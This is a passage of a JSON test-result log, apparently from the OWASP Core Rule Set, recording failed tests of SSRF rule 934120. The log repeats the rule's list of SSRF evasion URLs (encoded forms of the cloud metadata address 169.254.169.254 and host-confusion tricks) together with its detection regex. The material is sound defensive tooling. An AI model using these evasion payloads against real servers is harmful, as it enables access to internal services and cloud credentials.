          "text" : " We add captures for these evasion techniques: (see source in util/regexp-assemble/data/regexp-934120.data)"
        }, {
          "type" : "Comment",
          "text" : " http://425.510.425.510/ Dotted decimal with overflow (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://2852039166/ Dotless decimal - \\d{10}"
        }, {
          "type" : "Comment",
          "text" : " http://7147006462/ Dotless decimal with overflow - \\d{10}"
        }, {
          "type" : "Comment",
          "text" : " http://0xA9.0xFE.0xA9.0xFE/ Dotted hexadecimal - (?:0x[a-f0-9]{2}\\.){3}0x[a-f0-9]{2}"
        }, {
          "type" : "Comment",
          "text" : " http://0xA9FEA9FE/ Dotless hexadecimal - 0x[a-f0-9]{8}"
        }, {
          "type" : "Comment",
          "text" : " http://0x41414141A9FEA9FE/ Dotless hexadecimal with overflow - 0x[a-f0-9]{16}"
        }, {
          "type" : "Comment",
          "text" : " http://0251.0376.0251.0376/ Dotted octal - Covered by the same below"
        }, {
          "type" : "Comment",
          "text" : " http://0251.00376.000251.0000376/ Dotted octal with padding - (?:0{1,4}\\d{3}\\.){3}0{1,4}\\d{3})"
        }, {
          "type" : "Comment",
          "text" : " http://169.254.43518/ - (?:\\d{1,3}\\.){2}\\.\\d{5}"
        }, {
          "type" : "Comment",
          "text" : " http://169.16689662/ - \\d{1,3}\\.\\d{8}"
        }, {
          "type" : "Comment",
          "text" : " http://[::ffff:a9fe:a9fe] IPV6 Compressed - IPv6 regex from https://ihateregex.io/expr/ipv6/, with [0-9] converted to \\d and with non-capturing groups (below)"
        }, {
          "type" : "Comment",
          "text" : " http://[0:0:0:0:0:ffff:a9fe:a9fe] IPV6 Expanded -  (?:(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(?:[0-9a-fA-F]{1,4}:){1,7}:|(?:[0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|(?:[0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|(?:[0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|(?:[0-9a-fA-F]{1,4}:){1,3}(?::[0-9a-fA-F]{1,4}){1,4}|(?:[0-9a-fA-F]{1,4}:){1,2}(?::[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:(?:(?::[0-9a-fA-F]{1,4}){1,6})|:(?:(?::[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(?::[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(?::0{1,4}){0,1}:){0,1}(?:(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d)\\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d)|(?:[0-9a-fA-F]{1,4}:){1,4}:(?:(?:25[0-5]|(2[0-4]|1{0,1}\\d){0,1}\\d)\\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d))"
        }, {
          "type" : "Comment",
          "text" : " http://[0:0:0:0:0:ffff:169.254.169.254] IPV6/IPV4 - ((?:[0-9a-fA-F]{1,4}:){6}(?:(25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d)\\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d))"
        }, {
          "type" : "Comment",
          "text" : " http://[::]"
        }, {
          "type" : "Comment",
          "text" : " http://127.88.23.245:22/+&@google.com:80#+@google.com:80/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://127.88.23.245:22/?@google.com:80/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://127.88.23.245:22/#@www.google.com:80/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://google.com:80\\\\@127.88.23.245:22/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://google.com:80+&@127.88.23.245:22/#+@google.com:80/"
        }, {
          "type" : "Comment",
          "text" : " http://google.com:80+&@google.com:80#+@127.88.23.245:22/"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/934120.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 934120"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:a(?:cap|f[ps]|ttachment)|b(?:eshare|itcoin|lob)|c(?:a(?:llto|p)|id|vs|ompress.(?:zlib|bzip2))|d(?:a(?:v|ta)|ict|n(?:s|tp))|e(?:d2k|xpect)|f(?:(?:ee)?d|i(?:le|nger|sh)|tps?)|g(?:it|o(?:pher)?|lob)|h(?:323|ttps?)|i(?:ax|cap|(?:ma|p)ps?|rc[6s]?)|ja(?:bbe)?r|l(?:dap[is]?|ocal_file)|m(?:a(?:ilto|ven)|ms|umble)|n(?:e(?:tdoc|ws)|fs|ntps?)|ogg|p(?:aparazzi|h(?:ar|p)|op(?:2|3s?)|r(?:es|oxy)|syc)|r(?:mi|sync|tm(?:f?p)?|ar)|s(?:3|ftp|ips?|m(?:[bs]|tps?)|n(?:ews|mp)|sh(?:2(?:.(?:s(?:hell|(?:ft|c)p)|exec|tunnel))?)?|vn(?:\\+ssh)?)|t(?:e(?:amspeak|lnet)|ftp|urns?)|u(?:dp|nreal|t2004)|v(?:entrilo|iew-source|nc)|w(?:ebcal|ss?)|x(?:mpp|ri)|zip)://(?:[0-9]{10}|(?:0x[0-9a-f]{2}\\.){3}0x[0-9a-f]{2}|0x(?:[0-9a-f]{8}|[0-9a-f]{16})|(?:0{1,4}[0-9]{1,3}\\.){3}0{1,4}[0-9]{1,3}|[0-9]{1,3}\\.(?:[0-9]{1,3}\\.[0-9]{5}|[0-9]{8})|(?:\\x5c\\x5c[\\-0-9a-z]\\.?_?)+|\\[[0-:a-f]+(?:[\\.0-9]+|%[0-9A-Z_a-z]+)?\\]|[a-z][\\-\\.0-9A-Z_a-z]{1,255}:[0-9]{1,5}(?:#?[\\s\\x0b]*&?@(?:(?:[0-9]{1,3}\\.){3}[0-9]{1,3}|[a-z][\\-\\.0-9A-Z_a-z]{1,255}):[0-9]{1,5}/?)+|[\\.0-9]{0,11}(?:\\x{e2}(?:\\x91[\\xa0-\\x{bf}]|\\x92[\\x80-\\x{bf}]|\\x93[\\x80-\\x{a9}\\x{ab}-\\x{bf}])|\\x{e3}\\x80\\x82)+)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 934120
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Possible Server Side Request Forgery (SSRF) Attack: URL Parameter using IP Address"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-ssrf"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-GENERIC"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/225/664"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "934120",
    "test_id" : 23,
    "test_path" : "REQUEST-934-APPLICATION-ATTACK-GENERIC/934120.yaml",
    "description" : "SSRF - Enclosed alphanumerics 1 - digits",
    "cause" : "failed expect_id check: 934120 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920250 - UTF8 Encoding Abuse Attack Attempt", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=931130 - Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters" ]
    },
    "test" : {
      "test_id" : 23,
      "desc" : "SSRF - Enclosed alphanumerics 1 - digits",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5"
          },
          "method" : "GET",
          "uri" : "/get?ssrf=acap://...",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934120 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 934120,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " -=[ SSRF Attacks ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " PL2 rules adds SSRF capture for common evasion techniques."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " We add captures for these evasion techniques: (see source in util/regexp-assemble/data/regexp-934120.data)"
        }, {
          "type" : "Comment",
          "text" : " http://425.510.425.510/ Dotted decimal with overflow (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://2852039166/ Dotless decimal - \\d{10}"
        }, {
          "type" : "Comment",
          "text" : " http://7147006462/ Dotless decimal with overflow - \\d{10}"
        }, {
          "type" : "Comment",
          "text" : " http://0xA9.0xFE.0xA9.0xFE/ Dotted hexadecimal - (?:0x[a-f0-9]{2}\\.){3}0x[a-f0-9]{2}"
        }, {
          "type" : "Comment",
          "text" : " http://0xA9FEA9FE/ Dotless hexadecimal - 0x[a-f0-9]{8}"
        }, {
          "type" : "Comment",
          "text" : " http://0x41414141A9FEA9FE/ Dotless hexadecimal with overflow - 0x[a-f0-9]{16}"
        }, {
          "type" : "Comment",
          "text" : " http://0251.0376.0251.0376/ Dotted octal - Covered by the same below"
        }, {
          "type" : "Comment",
          "text" : " http://0251.00376.000251.0000376/ Dotted octal with padding - (?:0{1,4}\\d{3}\\.){3}0{1,4}\\d{3})"
        }, {
          "type" : "Comment",
          "text" : " http://169.254.43518/ - (?:\\d{1,3}\\.){2}\\.\\d{5}"
        }, {
          "type" : "Comment",
          "text" : " http://169.16689662/ - \\d{1,3}\\.\\d{8}"
        }, {
          "type" : "Comment",
          "text" : " http://[::ffff:a9fe:a9fe] IPV6 Compressed - IPv6 regex from https://ihateregex.io/expr/ipv6/, with [0-9] converted to \\d and with non-capturing groups (below)"
        }, {
          "type" : "Comment",
          "text" : " http://[0:0:0:0:0:ffff:a9fe:a9fe] IPV6 Expanded -  (?:(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(?:[0-9a-fA-F]{1,4}:){1,7}:|(?:[0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|(?:[0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|(?:[0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|(?:[0-9a-fA-F]{1,4}:){1,3}(?::[0-9a-fA-F]{1,4}){1,4}|(?:[0-9a-fA-F]{1,4}:){1,2}(?::[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:(?:(?::[0-9a-fA-F]{1,4}){1,6})|:(?:(?::[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(?::[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(?::0{1,4}){0,1}:){0,1}(?:(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d)\\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d)|(?:[0-9a-fA-F]{1,4}:){1,4}:(?:(?:25[0-5]|(2[0-4]|1{0,1}\\d){0,1}\\d)\\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d))"
        }, {
          "type" : "Comment",
          "text" : " http://[0:0:0:0:0:ffff:169.254.169.254] IPV6/IPV4 - ((?:[0-9a-fA-F]{1,4}:){6}(?:(25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d)\\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d))"
        }, {
          "type" : "Comment",
          "text" : " http://[::]"
        }, {
          "type" : "Comment",
          "text" : " http://127.88.23.245:22/+&@google.com:80#+@google.com:80/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://127.88.23.245:22/?@google.com:80/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://127.88.23.245:22/#@www.google.com:80/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://google.com:80\\\\@127.88.23.245:22/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://google.com:80+&@127.88.23.245:22/#+@google.com:80/"
        }, {
          "type" : "Comment",
          "text" : " http://google.com:80+&@google.com:80#+@127.88.23.245:22/"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/934120.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 934120"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:a(?:cap|f[ps]|ttachment)|b(?:eshare|itcoin|lob)|c(?:a(?:llto|p)|id|vs|ompress.(?:zlib|bzip2))|d(?:a(?:v|ta)|ict|n(?:s|tp))|e(?:d2k|xpect)|f(?:(?:ee)?d|i(?:le|nger|sh)|tps?)|g(?:it|o(?:pher)?|lob)|h(?:323|ttps?)|i(?:ax|cap|(?:ma|p)ps?|rc[6s]?)|ja(?:bbe)?r|l(?:dap[is]?|ocal_file)|m(?:a(?:ilto|ven)|ms|umble)|n(?:e(?:tdoc|ws)|fs|ntps?)|ogg|p(?:aparazzi|h(?:ar|p)|op(?:2|3s?)|r(?:es|oxy)|syc)|r(?:mi|sync|tm(?:f?p)?|ar)|s(?:3|ftp|ips?|m(?:[bs]|tps?)|n(?:ews|mp)|sh(?:2(?:.(?:s(?:hell|(?:ft|c)p)|exec|tunnel))?)?|vn(?:\\+ssh)?)|t(?:e(?:amspeak|lnet)|ftp|urns?)|u(?:dp|nreal|t2004)|v(?:entrilo|iew-source|nc)|w(?:ebcal|ss?)|x(?:mpp|ri)|zip)://(?:[0-9]{10}|(?:0x[0-9a-f]{2}\\.){3}0x[0-9a-f]{2}|0x(?:[0-9a-f]{8}|[0-9a-f]{16})|(?:0{1,4}[0-9]{1,3}\\.){3}0{1,4}[0-9]{1,3}|[0-9]{1,3}\\.(?:[0-9]{1,3}\\.[0-9]{5}|[0-9]{8})|(?:\\x5c\\x5c[\\-0-9a-z]\\.?_?)+|\\[[0-:a-f]+(?:[\\.0-9]+|%[0-9A-Z_a-z]+)?\\]|[a-z][\\-\\.0-9A-Z_a-z]{1,255}:[0-9]{1,5}(?:#?[\\s\\x0b]*&?@(?:(?:[0-9]{1,3}\\.){3}[0-9]{1,3}|[a-z][\\-\\.0-9A-Z_a-z]{1,255}):[0-9]{1,5}/?)+|[\\.0-9]{0,11}(?:\\x{e2}(?:\\x91[\\xa0-\\x{bf}]|\\x92[\\x80-\\x{bf}]|\\x93[\\x80-\\x{a9}\\x{ab}-\\x{bf}])|\\x{e3}\\x80\\x82)+)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 934120
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Possible Server Side Request Forgery (SSRF) Attack: URL Parameter using IP Address"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-ssrf"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-GENERIC"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/225/664"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "934120",
    "test_id" : 24,
    "test_path" : "REQUEST-934-APPLICATION-ATTACK-GENERIC/934120.yaml",
    "description" : "SSRF - Enclosed alphanumerics 2 - digits",
    "cause" : "failed expect_id check: 934120 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=931130 - Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters" ]
    },
    "test" : {
      "test_id" : 24,
      "desc" : "SSRF - Enclosed alphanumerics 2 - digits",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5"
          },
          "method" : "GET",
          "uri" : "/get?ssrf=imap://...",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934120 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 934120,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " -=[ SSRF Attacks ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " PL2 rules adds SSRF capture for common evasion techniques."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " We add captures for these evasion techniques: (see source in util/regexp-assemble/data/regexp-934120.data)"
        }, {
          "type" : "Comment",
          "text" : " http://425.510.425.510/ Dotted decimal with overflow (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://2852039166/ Dotless decimal - \\d{10}"
        }, {
          "type" : "Comment",
          "text" : " http://7147006462/ Dotless decimal with overflow - \\d{10}"
        }, {
          "type" : "Comment",
          "text" : " http://0xA9.0xFE.0xA9.0xFE/ Dotted hexadecimal - (?:0x[a-f0-9]{2}\\.){3}0x[a-f0-9]{2}"
        }, {
          "type" : "Comment",
          "text" : " http://0xA9FEA9FE/ Dotless hexadecimal - 0x[a-f0-9]{8}"
        }, {
          "type" : "Comment",
          "text" : " http://0x41414141A9FEA9FE/ Dotless hexadecimal with overflow - 0x[a-f0-9]{16}"
        }, {
          "type" : "Comment",
          "text" : " http://0251.0376.0251.0376/ Dotted octal - Covered by the same below"
        }, {
          "type" : "Comment",
          "text" : " http://0251.00376.000251.0000376/ Dotted octal with padding - (?:0{1,4}\\d{3}\\.){3}0{1,4}\\d{3})"
        }, {
          "type" : "Comment",
          "text" : " http://169.254.43518/ - (?:\\d{1,3}\\.){2}\\.\\d{5}"
        }, {
          "type" : "Comment",
          "text" : " http://169.16689662/ - \\d{1,3}\\.\\d{8}"
        }, {
          "type" : "Comment",
          "text" : " http://[::ffff:a9fe:a9fe] IPV6 Compressed - IPv6 regex from https://ihateregex.io/expr/ipv6/, with [0-9] converted to \\d and with non-capturing groups (below)"
        }, {
          "type" : "Comment",
          "text" : " http://[0:0:0:0:0:ffff:a9fe:a9fe] IPV6 Expanded -  (?:(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(?:[0-9a-fA-F]{1,4}:){1,7}:|(?:[0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|(?:[0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|(?:[0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|(?:[0-9a-fA-F]{1,4}:){1,3}(?::[0-9a-fA-F]{1,4}){1,4}|(?:[0-9a-fA-F]{1,4}:){1,2}(?::[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:(?:(?::[0-9a-fA-F]{1,4}){1,6})|:(?:(?::[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(?::[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(?::0{1,4}){0,1}:){0,1}(?:(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d)\\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d)|(?:[0-9a-fA-F]{1,4}:){1,4}:(?:(?:25[0-5]|(2[0-4]|1{0,1}\\d){0,1}\\d)\\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d))"
        }, {
          "type" : "Comment",
          "text" : " http://[0:0:0:0:0:ffff:169.254.169.254] IPV6/IPV4 - ((?:[0-9a-fA-F]{1,4}:){6}(?:(25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d)\\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d))"
        }, {
          "type" : "Comment",
          "text" : " http://[::]"
        }, {
          "type" : "Comment",
          "text" : " http://127.88.23.245:22/+&@google.com:80#+@google.com:80/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://127.88.23.245:22/?@google.com:80/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://127.88.23.245:22/#@www.google.com:80/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://google.com:80\\\\@127.88.23.245:22/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://google.com:80+&@127.88.23.245:22/#+@google.com:80/"
        }, {
          "type" : "Comment",
          "text" : " http://google.com:80+&@google.com:80#+@127.88.23.245:22/"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/934120.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 934120"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:a(?:cap|f[ps]|ttachment)|b(?:eshare|itcoin|lob)|c(?:a(?:llto|p)|id|vs|ompress.(?:zlib|bzip2))|d(?:a(?:v|ta)|ict|n(?:s|tp))|e(?:d2k|xpect)|f(?:(?:ee)?d|i(?:le|nger|sh)|tps?)|g(?:it|o(?:pher)?|lob)|h(?:323|ttps?)|i(?:ax|cap|(?:ma|p)ps?|rc[6s]?)|ja(?:bbe)?r|l(?:dap[is]?|ocal_file)|m(?:a(?:ilto|ven)|ms|umble)|n(?:e(?:tdoc|ws)|fs|ntps?)|ogg|p(?:aparazzi|h(?:ar|p)|op(?:2|3s?)|r(?:es|oxy)|syc)|r(?:mi|sync|tm(?:f?p)?|ar)|s(?:3|ftp|ips?|m(?:[bs]|tps?)|n(?:ews|mp)|sh(?:2(?:.(?:s(?:hell|(?:ft|c)p)|exec|tunnel))?)?|vn(?:\\+ssh)?)|t(?:e(?:amspeak|lnet)|ftp|urns?)|u(?:dp|nreal|t2004)|v(?:entrilo|iew-source|nc)|w(?:ebcal|ss?)|x(?:mpp|ri)|zip)://(?:[0-9]{10}|(?:0x[0-9a-f]{2}\\.){3}0x[0-9a-f]{2}|0x(?:[0-9a-f]{8}|[0-9a-f]{16})|(?:0{1,4}[0-9]{1,3}\\.){3}0{1,4}[0-9]{1,3}|[0-9]{1,3}\\.(?:[0-9]{1,3}\\.[0-9]{5}|[0-9]{8})|(?:\\x5c\\x5c[\\-0-9a-z]\\.?_?)+|\\[[0-:a-f]+(?:[\\.0-9]+|%[0-9A-Z_a-z]+)?\\]|[a-z][\\-\\.0-9A-Z_a-z]{1,255}:[0-9]{1,5}(?:#?[\\s\\x0b]*&?@(?:(?:[0-9]{1,3}\\.){3}[0-9]{1,3}|[a-z][\\-\\.0-9A-Z_a-z]{1,255}):[0-9]{1,5}/?)+|[\\.0-9]{0,11}(?:\\x{e2}(?:\\x91[\\xa0-\\x{bf}]|\\x92[\\x80-\\x{bf}]|\\x93[\\x80-\\x{a9}\\x{ab}-\\x{bf}])|\\x{e3}\\x80\\x82)+)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 934120
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
